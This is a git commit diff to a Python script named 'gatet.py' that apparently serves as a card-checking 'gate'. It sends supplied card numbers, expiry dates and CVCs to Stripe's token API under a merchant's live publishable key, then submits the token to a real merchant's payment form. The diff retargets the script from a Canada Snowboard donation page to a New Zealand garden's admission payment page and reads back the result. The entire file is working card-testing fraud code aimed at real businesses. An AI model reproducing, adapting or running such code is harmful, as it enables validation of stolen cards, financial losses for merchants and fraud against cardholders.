96a0787fc88e24c560802f4d61eef3bee84292dd
Rodamuser08 <rodamuser08@gmail.com>
2025-05-14 02:42:01 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -16,7 +16,7 @@ def Tele(ccx):
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
-	    'accept-language': 'en-US',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded',
 	    'origin': 'https://js.stripe.com',
 	    'referer': 'https://js.stripe.com/',
@@ -29,20 +29,20 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'key=pk_live_51LsTcMGXCOfsQVIW9dXATKGVOREgEjIs4daDD2QNr71WB2wnZdpVnR6sX4Y2YQ7lJWgFRPYGyT042P7PQ1QcDAw300GimtEWTe&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[exp_month]={mm}&card[exp_year]=20{yy}&card[cvc]={cvc}'
+	data = f'card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fb7b0ea5ef3%3B+stripe-js-v3%2Fb7b0ea5ef3%3B+card-element&key=pk_live_51HWZDSG26nFsMMEanKbIfiDzvA5X2JSkj2HcRAL9JssntHja6TBO4bHhDA09IrFxLGgrAkDnnTyaQ2dzNUuGO5Gn00XQ8yyaWd'
 	
 	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
 	
 	tok = response.json()['id']
 	
 	headers = {
-	    'authority': 'www.canadasnowboard.ca',
+	    'authority': 'ayrlies.co.nz',
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'cache-control': 'max-age=0',
 	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://www.canadasnowboard.ca',
-	    'referer': 'https://www.canadasnowboard.ca/en/partners/fundraising/givenow/',
+	    'origin': 'https://ayrlies.co.nz',
+	    'referer': 'https://ayrlies.co.nz/visit/payment/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -55,35 +55,19 @@ def Tele(ccx):
 	}
 	
 	data = {
-	    'stripeToken': f'{tok}',
-	    'total': '1',
-	    'amount_other': '1',
-	    'association': 'National',
-	    'designation': 'General',
-	    'terms_1': 'I confirm that this donation is made voluntarily and unconditionally to Canada Snowboard to support Canadian athletes on their journey to the podium. I understand that Canada Snowboard can direct this donation to the initiative of their choice; however it is preferred that this donation be used to support the designation I\'ve indicated." ',
-	    'name': 'Rodam User',
-	    'organization': '',
+	    'visitor_number': '1',
+	    'first_name': 'Rodam',
+	    'last_name': 'User',
 	    'email': 'rodamuser08@gmail.com',
 	    'phone': '4303000850',
-	    'address': 'Street 27',
-	    'city': 'New York',
-	    'province': 'NY',
-	    'postal_code': '10080',
-	    'country': 'US',
-	    'name_on_card': 'Dao Khao Saard',
-	    'comments': '',
-	    'terms_2': 'I understand that an official receipt for tax purposes will be issued in accordance with CRA\'s interpretation of "qualifying donations". I confirm that no benefit will accrue to me or any related party as a result of this contribution and that this donation does not reduce any obligations I am required to pay to Canada Snowboard for "non-qualifying" expenses such as membership/registration fees, travel and training expenses or other expenses I am normally required to pay. I also understand that misrepresentations of tax matters can result in civil penalties imposed against me.',
+	    'admission_type': 'garden_admission',
+	    'gw_price': '100',
+	    'pf_price': '100',
+	    'stripeToken': f'{tok}',
 	}
 	
-	response = requests.post(
-	    'https://www.canadasnowboard.ca/en/partners/fundraising/givenow/',
-	    headers=headers,
-	    data=data,
-	)
+	response = requests.post('https://ayrlies.co.nz/visit/payment-confirmation/', headers=headers, data=data)
 	
-	try:
-		result = re.search(r"<p class='error'>(.*?)</p>", response.text).group(1)
-	except:
-		result = re.search(r"<h1>(.*?)!</h1>", response.text).group(1)
+	result = re.search(r"<h2>(.*?)</h2>", response.text).group(1)
 	
 	return (result)
